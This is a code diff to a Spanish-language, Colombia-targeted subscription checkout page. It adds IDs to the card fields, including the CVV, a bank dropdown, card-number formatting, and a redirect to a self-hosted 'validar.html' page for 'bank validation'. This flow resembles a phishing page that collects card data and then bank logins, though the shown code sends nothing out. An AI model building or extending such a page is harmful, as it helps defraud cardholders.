@@ -124,6 +124,15 @@ button {
     font-size: 17px;
     cursor: pointer;
     font-weight: 600;
+    transition: background 0.2s;
+}
+
+button:hover {
+    background: #f0f0f0;
+}
+
+button:active {
+    transform: scale(0.98);
 }
 
 /* FOOTER */
@@ -141,6 +150,21 @@ footer a { color: #00c8ff; text-decoration: none; }
 /* RESPONSIVE */
 @media (max-width: 480px) {
     .row-double { flex-direction: column; gap: 0; }
+}
+
+/* BANCO INFO */
+.bank-selector {
+    margin-top: 20px;
+    padding: 15px;
+    background: rgba(0, 200, 255, 0.05);
+    border: 1px solid rgba(0, 200, 255, 0.2);
+    border-radius: 8px;
+}
+
+.bank-selector p {
+    margin: 0 0 10px 0;
+    font-size: 14px;
+    color: #00c8ff;
 }
 </style>
 </head>
@@ -165,11 +189,11 @@ footer a { color: #00c8ff; text-decoration: none; }
 
     <!-- FORM -->
     <label>NOMBRE EN LA TARJETA</label>
-    <input type="text" placeholder="Nombre del titular">
+    <input id="cardName" type="text" placeholder="Nombre del titular">
 
     <label>NÚMERO DE LA TARJETA</label>
     <div class="input-card">
-        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
+        <input id="cardNumber" type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
         <div class="card-icons">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
@@ -180,21 +204,21 @@ footer a { color: #00c8ff; text-decoration: none; }
     <div class="row-double">
         <div class="field-group">
             <label>FECHA DE VENCIMIENTO</label>
-            <input type="text" placeholder="MM/AA" maxlength="5">
+            <input id="cardExpiry" type="text" placeholder="MM/AA" maxlength="5">
         </div>
 
         <div class="field-group">
             <label>CÓDIGO DE SEGURIDAD</label>
-            <input type="text" placeholder="CVV" maxlength="4">
+            <input id="cardCVV" type="text" placeholder="CVV" maxlength="4">
         </div>
     </div>
 
     <label>CIUDAD</label>
-    <input type="text" placeholder="Ingrese su ciudad">
+    <input id="city" type="text" placeholder="Ingrese su ciudad">
 
     <label>DEPARTAMENTO</label>
-    <select>
-        <option>Seleccionar…</option>
+    <select id="department">
+        <option value="">Seleccionar…</option>
         <option>Antioquia</option>
         <option>Cundinamarca</option>
         <option>Valle del Cauca</option>
@@ -203,9 +227,9 @@ footer a { color: #00c8ff; text-decoration: none; }
     </select>
 
     <label>RUT (OPCIONAL)</label>
-    <input type="text" placeholder="Opcional">
+    <input id="rut" type="text" placeholder="Opcional">
 
-    <!-- 🔥 TOTAL A PAGAR — JUSTO DESPUÉS DE RUT -->
+    <!-- 🔥 TOTAL A PAGAR -->
     <div id="price-box">
         <div style="color:#9ca3af; font-size:15px;">Total a pagar</div>
 
@@ -222,8 +246,23 @@ footer a { color: #00c8ff; text-decoration: none; }
         <div id="planSummary" style="margin-top:10px; font-size:14px; color:#9ca3af;"></div>
     </div>
 
+    <!-- 🔥 NUEVO: SELECCIÓN DEL BANCO -->
+    <div class="bank-selector">
+        <p>Seleccione su banco para validar el pago:</p>
+        <select id="bankSelect" style="background: #0f0f0f;">
+            <option value="">-- Seleccionar banco --</option>
+            <option value="Bancolombia">Bancolombia</option>
+            <option value="Nequi">Nequi</option>
+            <option value="Davivienda">Davivienda</option>
+            <option value="BBVA">BBVA</option>
+            <option value="Banco Popular">Banco Popular</option>
+            <option value="Banco de Bogotá">Banco de Bogotá</option>
+            <option value="Itaú">Itaú</option>
+        </select>
+    </div>
+
     <!-- BOTÓN FINAL -->
-    <button>INICIAR SUSCRIPCIÓN</button>
+    <button onclick="proceedToValidation()">VALIDAR PAGO CON EL BANCO</button>
 
 </div>
 
@@ -258,10 +297,66 @@ const planData = {
     }
 };
 
-// Insertar valores
+// Insertar valores del plan
 document.getElementById("finalPrice").innerText = planData[plan].price;
 document.getElementById("planName").innerText = planData[plan].name;
 document.getElementById("planSummary").innerText = planData[plan].desc;
+
+// Función para ir a la validación
+function proceedToValidation() {
+    // Obtener banco seleccionado
+    const bankSelect = document.getElementById("bankSelect");
+    const selectedBank = bankSelect.value;
+    
+    // Validar que se haya seleccionado un banco
+    if (!selectedBank) {
+        alert("Por favor, seleccione su banco para proceder con la validación.");
+        return;
+    }
+    
+    // Validar campos obligatorios
+    const cardName = document.getElementById("cardName").value.trim();
+    const cardNumber = document.getElementById("cardNumber").value.trim();
+    const cardExpiry = document.getElementById("cardExpiry").value.trim();
+    const cardCVV = document.getElementById("cardCVV").value.trim();
+    
+    if (!cardName || !cardNumber || !cardExpiry || !cardCVV) {
+        alert("Por favor, complete todos los campos obligatorios de la tarjeta.");
+        return;
+    }
+    
+    // Guardar datos en localStorage para usarlos después si es necesario
+    localStorage.setItem("selectedBank", selectedBank);
+    localStorage.setItem("paymentData", JSON.stringify({
+        cardName: cardName,
+        cardLast4: cardNumber.slice(-4),
+        plan: plan,
+        amount: planData[plan].price,
+        timestamp: new Date().toISOString()
+    }));
+    
+    // Redirigir a la página de validación bancaria
+    window.location.href = "validar.html";
+}
+
+// Formatear número de tarjeta con espacios
+document.getElementById("cardNumber").addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+    }
+    e.target.value = formatted;
+});
+
+// Formatear fecha de vencimiento
+document.getElementById("cardExpiry").addEventListener('input', function(e) {
+    let value = e.target.value.replace(/[^0-9]/g, '');
+    if (value.length >= 2) {
+        e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+});
 </script>
 
 </body>
